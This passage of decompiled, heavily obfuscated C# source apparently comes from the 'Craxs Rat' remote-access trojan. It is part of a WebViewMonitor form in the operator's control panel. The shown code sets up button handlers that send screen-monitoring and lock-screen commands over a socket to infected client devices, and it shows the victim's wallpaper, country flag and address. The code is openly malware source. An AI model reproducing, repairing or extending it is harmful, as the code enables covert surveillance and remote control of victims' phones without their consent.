            case 7:
              chkctrl = ((WebViewMonitor) this)._chkctrl;
              num1 = (int) num3 * -51869638 ^ -104548852;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    public virtual DrakeUIAvatar StartButton
    {
      get => ((WebViewMonitor) this)._StartButton;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar3_Click);
label_1:
        int num1 = 1885813675;
        DrakeUIAvatar startButton;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(num1 ^ ~(~-899473929 + -1344722839 * -1252217981) - ~((-1993816308 - -103511627) * 1276966633) ^ ~-1253788504) ^ -(-285821145 * (-773049904 * -1121511413)))) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              startButton.Click -= eventHandler;
              num1 = (int) num2 * -277738494 ^ -1559055493;
              continue;
            case 2:
              ((WebViewMonitor) this)._StartButton = value;
              startButton = ((WebViewMonitor) this)._StartButton;
              num1 = 602713065;
              continue;
            case 3:
              goto label_3;
            case 4:
              int num3 = startButton == null ? 1599094170 : (num3 = 1722506753);
              num1 = num3 ^ (int) num2 * 1570489756;
              continue;
            case 5:
              startButton = ((WebViewMonitor) this)._StartButton;
              int num4 = startButton == null ? -1605321737 : (num4 = -672236559);
              num1 = num4 ^ (int) num2 * -1466349162;
              continue;
            case 6:
              startButton.Click += eventHandler;
              num1 = (int) num2 * -1425621334 ^ -1490561410;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    public virtual DrakeUIAvatar StopButton
    {
      get => ((WebViewMonitor) this)._StopButton;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.StopButton_Click);
        DrakeUIAvatar stopButton = ((WebViewMonitor) this)._StopButton;
        if (stopButton == null)
          goto label_5;
label_1:
        int num1 = 809195990;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 + --(~-1723224139 - -282941517 ^ -(84198025 - -1926936952)) + ((222745905 * 15529245 ^ 1819442429 ^ 519483075) * -1055010261 ^ --~-1071489530) + (--1157283974 * 439909373 - (~79223789 - (1909496475 - -794776745))))) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = stopButton == null ? 656861225 : (num3 = 1095926300);
              num1 = num3 ^ (int) num2 * -654230122;
              continue;
            case 2:
              stopButton.Click += eventHandler;
              num1 = (int) num2 * 1997178553 ^ -653549067;
              continue;
            case 3:
              goto label_3;
            case 4:
              stopButton.Click -= eventHandler;
              num1 = (int) num2 * 1357203441 ^ -1835224313;
              continue;
            case 5:
              goto label_5;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_5:
        ((WebViewMonitor) this)._StopButton = value;
        stopButton = ((WebViewMonitor) this)._StopButton;
        num1 = 200840135;
        goto label_2;
      }
    }

    internal virtual Panel Panel9
    {
      get => ((WebViewMonitor) this)._Panel9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((WebViewMonitor) this)._Panel9 = value;
    }

    public virtual DrakeUIAvatar DrakeUIAvatar5
    {
      get => ((WebViewMonitor) this)._DrakeUIAvatar5;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar5_Click);
        DrakeUIAvatar drakeUiAvatar5 = ((WebViewMonitor) this)._DrakeUIAvatar5;
        if (drakeUiAvatar5 == null)
          goto label_7;
label_1:
        int num1 = 527772466;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~~(num1 * -784122055 * 2118421119) * 1221239837 * -976186031)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              drakeUiAvatar5.Click += eventHandler;
              num1 = (int) num2 * -1348339586 ^ -1762645016;
              continue;
            case 2:
              drakeUiAvatar5 = ((WebViewMonitor) this)._DrakeUIAvatar5;
              int num3 = drakeUiAvatar5 == null ? 432817924 : (num3 = -1175282309);
              num1 = num3 ^ (int) num2 * -1631011269;
              continue;
            case 3:
              goto label_1;
            case 4:
              drakeUiAvatar5.Click -= eventHandler;
              num1 = (int) num2 * 1442995966 ^ -979577427;
              continue;
            case 5:
              goto label_7;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_7:
        ((WebViewMonitor) this)._DrakeUIAvatar5 = value;
        num1 = 2073787598;
        goto label_2;
      }
    }

    public virtual DrakeUIAvatar DrakeUIAvatar6
    {
      get => ((WebViewMonitor) this)._DrakeUIAvatar6;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar6_Click);
        DrakeUIAvatar drakeUiAvatar6 = ((WebViewMonitor) this)._DrakeUIAvatar6;
label_1:
        int num1 = 982033911;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 - (-2083518907 * ((250613710 ^ 934183220) + (-67083300 ^ -409164171)) - ----1888130612 - ((-824894074 ^ -2056597630) + 187170916 * 55710657 ^ -575767453 ^ -1001110454)) ^ (-1080677804 ^ 1238038462) + (773175521 - 1627504188) - (1196224101 * -1161272611 + 514789809 * 1632477611) - (-519951395 - -1595935782 + --364867648 ^ 1903998174 - -1781215572 ^ ~650234354)) - -404314083)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = drakeUiAvatar6 == null ? -644545496 : (num3 = 1830711743);
              num1 = num3 ^ (int) num2 * 372967428;
              continue;
            case 2:
              int num4 = drakeUiAvatar6 == null ? -1380697970 : (num4 = -1286899220);
              num1 = num4 ^ (int) num2 * 1108751694;
              continue;
            case 3:
              ((WebViewMonitor) this)._DrakeUIAvatar6 = value;
              drakeUiAvatar6 = ((WebViewMonitor) this)._DrakeUIAvatar6;
              num1 = -2066513871;
              continue;
            case 4:
              goto label_3;
            case 5:
              drakeUiAvatar6.Click -= eventHandler;
              num1 = (int) num2 * 911064076 ^ -1254710544;
              continue;
            case 6:
              drakeUiAvatar6.Click += eventHandler;
              num1 = (int) num2 * -1789620246 ^ -1076407160;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    public virtual DrakeUIAvatar DrakeUIAvatar3
    {
      get => ((WebViewMonitor) this)._DrakeUIAvatar3;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar3_Click_1);
label_1:
        int num1 = 391572268;
        DrakeUIAvatar drakeUiAvatar3;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 * -2118613755 * 1643097339 * 779327255 - -550247837)) % 8U)
          {
            case 0:
              drakeUiAvatar3.Click -= eventHandler;
              num1 = (int) num2 * -1757342964 ^ 2135553640;
              continue;
            case 1:
              drakeUiAvatar3 = ((WebViewMonitor) this)._DrakeUIAvatar3;
              int num3 = drakeUiAvatar3 == null ? 696129063 : (num3 = -303725148);
              num1 = num3 ^ (int) num2 * -57592649;
              continue;
            case 2:
              goto label_1;
            case 3:
              drakeUiAvatar3 = ((WebViewMonitor) this)._DrakeUIAvatar3;
              num1 = (int) num2 * -637067734 ^ 1003027553;
              continue;
            case 4:
              int num4 = drakeUiAvatar3 == null ? 879404245 : (num4 = -306082658);
              num1 = num4 ^ (int) num2 * 207092139;
              continue;
            case 5:
              ((WebViewMonitor) this)._DrakeUIAvatar3 = value;
              num1 = -772651770;
              continue;
            case 6:
              goto label_3;
            case 7:
              drakeUiAvatar3.Click += eventHandler;
              num1 = (int) num2 * -419694155 ^ -818469422;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    public virtual DrakeUIAvatar DrakeUIAvatar4
    {
      get => ((WebViewMonitor) this)._DrakeUIAvatar4;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar4_Click);
        DrakeUIAvatar drakeUiAvatar4 = ((WebViewMonitor) this)._DrakeUIAvatar4;
label_1:
        int num1 = -1007294742;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(~num1 - (-1847102235 - (~(-1842589953 - -82354729) - 1385731420)) - ~(1804954263 - 461486963 ^ -1230541372)) * 531073391 - 1040970282)) % 8U)
          {
            case 0:
              drakeUiAvatar4 = ((WebViewMonitor) this)._DrakeUIAvatar4;
              num1 = (int) num2 * -270296489 ^ -675630343;
              continue;
            case 1:
              drakeUiAvatar4.Click += eventHandler;
              num1 = (int) num2 * 2100347301 ^ 1601135510;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num3 = drakeUiAvatar4 == null ? 1250209585 : (num3 = 841811384);
              num1 = num3 ^ (int) num2 * -1237158174;
              continue;
            case 4:
              int num4 = drakeUiAvatar4 == null ? 1689480367 : (num4 = -444618368);
              num1 = num4 ^ (int) num2 * 1202866345;
              continue;
            case 5:
              goto label_1;
            case 6:
              ((WebViewMonitor) this)._DrakeUIAvatar4 = value;
              num1 = 1092349901;
              continue;
            case 7:
              drakeUiAvatar4.Click -= eventHandler;
              num1 = (int) num2 * 693424393 ^ 964907680;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    public virtual DrakeUIAvatar DrakeUIAvatar7
    {
      get => ((WebViewMonitor) this)._DrakeUIAvatar7;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar7_Click);
label_1:
        int num1 = 1683505120;
        DrakeUIAvatar drakeUiAvatar7;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -((~num1 - (~(-1627832161 - 449901990 + 1530690775) ^ -1804624349 * -(-582824215 ^ 459369526)) - 435897475) * -2009814029 ^ -168303205 * 2004151510)) % 8U)
          {
            case 0:
              ((WebViewMonitor) this)._DrakeUIAvatar7 = value;
              drakeUiAvatar7 = ((WebViewMonitor) this)._DrakeUIAvatar7;
              num1 = 1227464445;
              continue;
            case 1:
              drakeUiAvatar7.Click += eventHandler;
              num1 = (int) num2 * -722310565 ^ 195955245;
              continue;
            case 2:
              drakeUiAvatar7.Click -= eventHandler;
              num1 = (int) num2 * 947582454 ^ 799699142;
              continue;
            case 3:
              int num3 = drakeUiAvatar7 == null ? -159846387 : (num3 = 22745003);
              num1 = num3 ^ (int) num2 * -1138420547;
              continue;
            case 4:
              goto label_3;
            case 5:
              int num4 = drakeUiAvatar7 == null ? -700385502 : (num4 = -1489646427);
              num1 = num4 ^ (int) num2 * 1279093476;
              continue;
            case 6:
              drakeUiAvatar7 = ((WebViewMonitor) this)._DrakeUIAvatar7;
              num1 = (int) num2 * -1139869795 ^ -367983443;
              continue;
            case 7:
              goto label_1;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIAvatar DrakeUIAvatar2
    {
      get => ((WebViewMonitor) this)._DrakeUIAvatar2;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar2_Click);
label_1:
        int num1 = 1736474227;
        DrakeUIAvatar drakeUiAvatar2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~~num1 ^ ((-1342546693 ^ -1993056035) - -2075627031 * 350530127) * 1309891997)) % 9U)
          {
            case 0:
              goto label_1;
            case 1:
              drakeUiAvatar2 = ((WebViewMonitor) this)._DrakeUIAvatar2;
              num1 = (int) num2 * 1873051999 ^ -991175511;
              continue;
            case 2:
              ((WebViewMonitor) this)._DrakeUIAvatar2 = value;
              num1 = 674836450;
              continue;
            case 3:
              drakeUiAvatar2.Click += eventHandler;
              num1 = (int) num2 * -1181763145 ^ 224275605;
              continue;
            case 4:
              drakeUiAvatar2.Click -= eventHandler;
              num1 = (int) num2 * 82392366 ^ -822346182;
              continue;
            case 5:
              goto label_3;
            case 6:
              int num3 = drakeUiAvatar2 == null ? 2142881192 : (num3 = 200565878);
              num1 = num3 ^ (int) num2 * 1094171278;
              continue;
            case 7:
              int num4 = drakeUiAvatar2 == null ? -245152757 : (num4 = -223504883);
              num1 = num4 ^ (int) num2 * -1618107270;
              continue;
            case 8:
              drakeUiAvatar2 = ((WebViewMonitor) this)._DrakeUIAvatar2;
              num1 = (int) num2 * -305275813 ^ -1447309161;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUITextBox textsend
    {
      get => ((WebViewMonitor) this)._textsend;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((WebViewMonitor) this)._textsend = value;
    }

    internal virtual DrakeUIAvatar DrakeUIAvatar9
    {
      get => ((WebViewMonitor) this)._DrakeUIAvatar9;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIAvatar9_Click);
        DrakeUIAvatar drakeUiAvatar9 = ((WebViewMonitor) this)._DrakeUIAvatar9;
label_1:
        int num1 = -1219181629;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-~((-~-1189735499 ^ ~~1240958051) - ~(num2 - -(538077497 - -2138838600 - (-1684226505 - -1216914095 + 1875952592 * -719140661) ^ -(-1028491255 ^ 811458206 * 377651269)))) * -1294371999)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = drakeUiAvatar9 == null ? 1647669042 : (num4 = 453715673);
              num1 = num4 ^ (int) num3 * 1924470902;
              continue;
            case 2:
              drakeUiAvatar9.Click += eventHandler;
              num1 = (int) num3 * -1988978797 ^ -765806254;
              continue;
            case 3:
              ((WebViewMonitor) this)._DrakeUIAvatar9 = value;
              num1 = -246325688;
              continue;
            case 4:
              goto label_3;
            case 5:
              drakeUiAvatar9.Click -= eventHandler;
              num1 = (int) num3 * -643037087 ^ -2033047352;
              continue;
            case 6:
              drakeUiAvatar9 = ((WebViewMonitor) this)._DrakeUIAvatar9;
              int num5 = drakeUiAvatar9 == null ? -78573209 : (num5 = -1857775070);
              num1 = num5 ^ (int) num3 * -384255969;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIButtonIcon pinbtn
    {
      get => ((WebViewMonitor) this)._pinbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.DrakeUIButtonIcon1_Click);
        DrakeUIButtonIcon pinbtn = ((WebViewMonitor) this)._pinbtn;
        if (pinbtn == null)
          goto label_7;
label_1:
        int num1 = -1271364804;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) (-(~(1727393138 - -2133875924) - ((-(-675087752 - -2112191341) ^ -(187597327 ^ 1062040093)) - (-num2 - --(133785363 - -1380323116 - --474267061)))) * -2025331445)) % 6U)
          {
            case 0:
              pinbtn.Click += eventHandler;
              num1 = (int) num3 * -265370022 ^ -969027843;
              continue;
            case 1:
              goto label_7;
            case 2:
              pinbtn.Click -= eventHandler;
              num1 = (int) num3 * 787487103 ^ -829497959;
              continue;
            case 3:
              pinbtn = ((WebViewMonitor) this)._pinbtn;
              int num4 = pinbtn == null ? 1519637609 : (num4 = 1532093908);
              num1 = num4 ^ (int) num3 * 1214184424;
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_7:
        ((WebViewMonitor) this)._pinbtn = value;
        num1 = -940731931;
        goto label_2;
      }
    }

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetWindowPos(
      IntPtr hWnd,
      IntPtr hWndInsertAfter,
      int X,
      int Y,
      int cx,
      int cy,
      uint uFlags);

    private void trans()
    {
      string language = RegistryHandler.Get_Language();
label_1:
      int num1 = -1604934872;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (-(-num1 * 1544294319 ^ -1048289013 - 714825565 - (1150812851 ^ -1235320700) ^ -1230647214 + (-807745757 - -1059485677)) * -992873203 * 1225736121)) % 11U)
        {
          case 0:
            num1 = (int) num2 * 1984609074 ^ -1054213099;
            continue;
          case 1:
            int num3 = Operators.CompareString(language, EXGuarder.\u003773C5440, false) == 0 ? 1489064014 : (num3 = -887353037);
            num1 = num3 ^ (int) num2 * -322715464;
            continue;
          case 2:
            int num4 = Operators.CompareString(language, EXGuarder.\u00376470456, false) != 0 ? -1426939955 : (num4 = -214903852);
            num1 = num4 ^ (int) num2 * -580089578;
            continue;
          case 3:
            this.StartButton.Text = Codes.Translate(this.StartButton.Text, EXGuarder.\u00372425043, EXGuarder.\u0032C1A0505);
            num1 = (int) num2 * 1363897282 ^ -1656825288;
            continue;
          case 4:
            this.Save.Text = EXGuarder.\u00348084F55;
            this.checkblock.Text = EXGuarder.\u003714F1560;
            this.chkctrl.Text = EXGuarder.\u0031E3F190E;
            num1 = (int) num2 * -1565519978 ^ -1046563983;
            continue;
          case 5:
            this.StopButton.Text = Codes.Translate(this.StopButton.Text, EXGuarder.\u00372425043, EXGuarder.\u0032C1A0505);
            num1 = (int) num2 * 1036080061 ^ 1515660068;
            continue;
          case 6:
            goto label_1;
          case 7:
            goto label_3;
          case 8:
            this.StartButton.Text = Codes.Translate(this.StartButton.Text, EXGuarder.\u00372425043, EXGuarder.\u00332440F06);
            this.StopButton.Text = Codes.Translate(this.StopButton.Text, EXGuarder.\u00372425043, EXGuarder.\u00332440F06);
            num1 = (int) num2 * 127414313 ^ -97137686;
            continue;
          case 9:
            this.Save.Text = EXGuarder.\u00304144A03;
            this.checkblock.Text = EXGuarder.\u00371022569;
            num1 = 72975079;
            continue;
          case 10:
            this.chkctrl.Text = EXGuarder.\u0031836191A;
            num1 = (int) num2 * -2087449549 ^ -420849106;
            continue;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsuhdfkjxba(object sender, EventArgs e)
    {
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatskjasnhfcs(object sender, EventArgs e)
    {
      this.combosize.Items.Clear();
label_1:
      int num1 = 49459727;
      bool flag;
      IntPtr hWndInsertAfter;
      string tip;
      int index;
      string[] sizearry;
      ShowTipform showTipform;
      int num2;
      int num3;
      while (true)
      {
        uint num4;
        switch ((num4 = (uint) ~((--num1 ^ ~-1936059278) * -725500995 * -905414911)) % 39U)
        {
          case 0:
            num1 = (int) num4 * -247441736 ^ -1458380935;
            continue;
          case 1:
            // ISSUE: reference to a compiler-generated method
            this.Qualtibox.Text = MySettings.get_Settings().live_sc_qulty;
            num1 = (int) num4 * -228208803 ^ -615239117;
            continue;
          case 2:
            this.Qualtibox.Text = EXGuarder.\u0032701360D;
            num1 = (int) num4 * 622430980 ^ -1626354935;
            continue;
          case 3:
            this.trans();
            num1 = (int) num4 * -1282628209 ^ -972062349;
            continue;
          case 4:
            this.PBS.MinimumSize = new Size(0, 0);
            this.PBS.Size = new Size(384, 5);
            num1 = (int) num4 * 1285129899 ^ 66384687;
            continue;
          case 5:
            this.combosize.Text = EXGuarder.\u0032B286F73;
            num1 = (int) num4 * -494835417 ^ 88215154;
            continue;
          case 6:
            this.combosize.Items.Add((object) sizearry[index]);
            num1 = 833794776;
            continue;
          case 7:
            this.PBS.Height = 5;
            num1 = (int) num4 * -228781587 ^ -1751658624;
            continue;
          case 8:
            num2 = 1;
            num1 = (int) num4 * 277571672 ^ -1484115441;
            continue;
          case 9:
            int num5;
            num1 = num5 = !flag ? -1621450818 : (num5 = -2054380733);
            continue;
          case 10:
            goto label_1;
          case 11:
            int num6 = Operators.CompareString(tip, EXGuarder.\u00340053936, false) != 0 ? 87909281 : (num6 = 487000779);
            num1 = num6 ^ (int) num4 * 1547807157;
            continue;
          case 12:
            this.toptitle.Text = EXGuarder.\u00344667026;
            num1 = (int) num4 * -799061489 ^ -1486246112;
            continue;
          case 13:
            this.Tag = (object) ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress;
            num1 = (int) num4 * -1765134355 ^ 49603462;
            continue;
          case 14:
            // ISSUE: reference to a compiler-generated field
            this.PictureBox2.Image = (Image) ((Data._Closure\u0024__39\u002D17) ((WebViewMonitor) this).classClient).Wallpaper;
            num1 = (int) num4 * -1782010662 ^ 824167590;
            continue;
          case 15:
            sizearry = ((WebViewMonitor) this).sizearry;
            index = 0;
            num1 = (int) num4 * 1455027525 ^ -2101053951;
            continue;
          case 16:
            this.Qualtibox.Items.Add((object) num2.ToString());
            checked { ++num2; }
            num1 = 528513259;
            continue;
          case 17:
            showTipform.Dispose();
            num1 = -2234907;
            continue;
          case 18:
            hWndInsertAfter = new IntPtr(-2);
            num1 = (int) num4 * 1776077425 ^ 738649965;
            continue;
          case 19:
            // ISSUE: reference to a compiler-generated field
            this.PictureBox3.Image = (Image) ((Data._Closure\u0024__39\u002D10) ((WebViewMonitor) this).classClient).Flag;
            num1 = (int) num4 * 893716281 ^ 1788596204;
            continue;
          case 20:
            this.PBS.Width = 384;
            num1 = (int) num4 * 283021572 ^ 1802698428;
            continue;
          case 21:
            this.TransparencyKey = Color.FromArgb(45, 45, 45);
            num1 = (int) num4 * 1736858420 ^ 951225845;
            continue;
          case 22:
            flag = true;
            num1 = -1545324407;
            continue;
          case 23:
            showTipform = new ShowTipform(ZoomPictureBox.ShowScrenShotTip, Craxs_Rat.My.Resources.Resources.Tip_screenctrol);
            tip = RegistryHandler.GET_Tip(ZoomPictureBox.ShowScrenShotTip);
            num1 = (int) num4 * 882147390 ^ 1623975260;
            continue;
          case 24:
            int num7 = num2 <= 100 ? -1823742456 : (num7 = -1084231659);
            num1 = num7 ^ (int) num4 * -1613030713;
            continue;
          case 25:
            this.KeyPreview = true;
            num1 = (int) num4 * 1527028483 ^ 676022772;
            continue;
          case 26:
            checked { ++num3; }
            int num8 = num3 <= 30 ? -1190968046 : (num8 = -674606773);
            num1 = num8 ^ (int) num4 * -223355479;
            continue;
          case 27:
            num1 = (int) num4 * 1714353913 ^ 181158629;
            continue;
          case 28:
            num3 = 2;
            num1 = (int) num4 * -1894052922 ^ -1732842412;
            continue;
          case 29:
            checked { ++index; }
            num1 = (int) num4 * -673958822 ^ 17373964;
            continue;
          case 30:
            ScreenShoter.SetWindowPos(this.Handle, hWndInsertAfter, 0, 0, 0, 0, 3U);
            ((WebViewMonitor) this).keepmeto = true;
            num1 = (int) num4 * -972431775 ^ -195252039;
            continue;
          case 31:
            this.FPSBOX.Items.Add((object) num3.ToString());
            num1 = 1877521228;
            continue;
          case 32:
            flag = false;
            num1 = (int) num4 * 391701094 ^ -7323446;
            continue;
          case 33:
            int num9 = (int) showTipform.ShowDialog();
            num1 = (int) num4 * -1158779768 ^ -806092682;
            continue;
          case 34:
            this.FPSBOX.Text = EXGuarder.\u00341795D30;
            this.Qualtibox.Items.Clear();
            num1 = (int) num4 * 1945634215 ^ 1887987085;
            continue;
          case 35:
            this.BackColor = Color.FromArgb(45, 45, 45);
            num1 = (int) num4 * -2138780611 ^ -397142418;
            continue;
          case 36:
            flag = true;
            int num10 = tip == null ? 889417542 : (num10 = 838786774);
            num1 = num10 ^ (int) num4 * 616522548;
            continue;
          case 37:
            goto label_3;
          case 38:
            int num11;
            num1 = num11 = index < sizearry.Length ? -1963558866 : (num11 = -918498136);
            continue;
          default:
            goto label_41;
        }
      }
label_3:
      return;
label_41:;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxscdasjj(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
label_2:
        int num1 = -1927830709;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -~(num1 * 1069404625)) % 3U)
          {
            case 0:
              goto label_7;
            case 1:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ((WebViewMonitor) this).classClient.SendMessage(new object[4]
              {
                (object) ((WebViewMonitor) this).Client,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00348416C72 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u003255A723B),
                (object) ((WebViewMonitor) this).classClient
              });
              num1 = (int) num2 * -528494344 ^ -239337619;
              continue;
            case 2:
              goto label_2;
            default:
              goto label_8;
          }
        }
label_7:
        return;
label_8:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcds(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
label_2:
        int num1 = -1219990384;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-((num1 + -65412081 * (1852483007 ^ --(-1235701391 ^ 1415234516)) - ~(-1660123461 * -46752627 - (122899989 * 207672336 + ~1166969447)) ^ -1576207463 * 1079896091 + -531060180 + -(-1240040576 ^ 1271146975)) * 2026643151) - 1158655327)) % 3U)
          {
            case 0:
              goto label_2;
            case 1:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ((WebViewMonitor) this).classClient.SendMessage(new object[4]
              {
                (object) ((WebViewMonitor) this).Client,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0035B46050E + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u003394E4916),
                (object) ((WebViewMonitor) this).classClient
              });
              num1 = (int) num2 * 97884966 ^ 1311551895;
              continue;
            case 2:
              goto label_7;
            default:
              goto label_8;
          }
        }
label_7:
        return;
label_8:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Button3_Click(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        ((WebViewMonitor) this).classClient.SendMessage(new object[4]
        {
          (object) ((WebViewMonitor) this).Client,
          (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u0036253736A + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.Lockscreen + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(0) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) ((WebViewMonitor) this).classClient).ClientRemoteAddress),
          (object) Codes.Encoding().GetBytes(EXGuarder.\u0032C1D381E),
          (object) ((WebViewMonitor) this).classClient
        });
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Button4_Click(object sender, EventArgs e)
    {
      if (((WebViewMonitor) this).classClient == null)
        return;
      try
      {
        string[] strArray = ((Data) ((WebViewMonitor) this).classClient).Keys.Split(':');
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
